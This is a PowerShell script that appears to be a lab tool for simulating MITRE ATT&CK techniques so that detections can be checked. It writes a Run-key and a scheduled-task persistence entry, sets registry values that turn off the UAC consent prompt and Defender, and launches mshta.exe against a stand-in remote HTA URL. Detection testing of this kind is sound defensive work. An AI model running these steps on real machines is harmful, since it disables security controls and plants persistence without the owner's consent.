# MITRE Simulation Framework – Argument-Parsed Version
# Author: ChatGPT | Manual ATT&CK Simulation With Arguments
# Safe for lab use only

param(
    [switch]$All,
    [switch]$RunKey,
    [switch]$UACBypass,
    [switch]$DisableDefender,
    [switch]$ScheduledTask,
    [switch]$LSASS,
    [switch]$MSHTA
)

function Write-Log($Message) {
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Output "[$time] $Message"
}

function Simulate-RunKey {
    try {
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LegalBackdoor" -Value "C:\\Windows\\System32\\notepad.exe" -Force | Out-Null
        Write-Log "[✓] T1547.001 - Persistence via Run Key written."
    } catch { Write-Log "[X] Run Key failed." }
}

function Simulate-UACBypass {
    try {
        New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -PropertyType DWord -Force | Out-Null
        Write-Log "[✓] T1548.002 - UAC Bypass simulated."
    } catch { Write-Log "[X] UAC Bypass failed." }
}

function Simulate-DisableDefender {
    try {
        New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force | Out-Null
        Write-Log "[✓] T1562.001 - Defender disabled via registry."
    } catch { Write-Log "[X] Defender modification failed." }
}

function Simulate-ScheduledTask {
    try {
        schtasks /create /tn "LegalTask" /tr "notepad.exe" /sc onlogon /f | Out-Null
        Write-Log "[✓] T1053.005 - Scheduled task created."
    } catch { Write-Log "[X] Scheduled task creation failed." }
}

function Simulate-LSASSAccess {
    try {
        tasklist /fi "imagename eq lsass.exe" | Out-Null
        Write-Log "[✓] T1003.001 - Simulated LSASS access."
    } catch { Write-Log "[X] LSASS simulation failed." }
}

function Simulate-MSHTA {
    try {
        Start-Process -FilePath "mshta.exe" -ArgumentList "http://example.com/fake.hta"
        Write-Log "[✓] T1218 - mshta.exe executed with remote argument."
    } catch { Write-Log "[X] mshta execution failed." }
}

Write-Log "MITRE Simulation (Arg-Based Mode) Starting..."

if ($All -or $RunKey)         { Simulate-RunKey }
if ($All -or $UACBypass)      { Simulate-UACBypass }
if ($All -or $DisableDefender){ Simulate-DisableDefender }
if ($All -or $ScheduledTask)  { Simulate-ScheduledTask }
if ($All -or $LSASS)          { Simulate-LSASSAccess }
if ($All -or $MSHTA)          { Simulate-MSHTA }

Write-Log "Simulation complete. Validate XQL hits and system logs."

<#
Example usage:
  .\Mitre_Simulation_ArgParsed.ps1 -All
  .\Mitre_Simulation_ArgParsed.ps1 -RunKey -ScheduledTask
#>
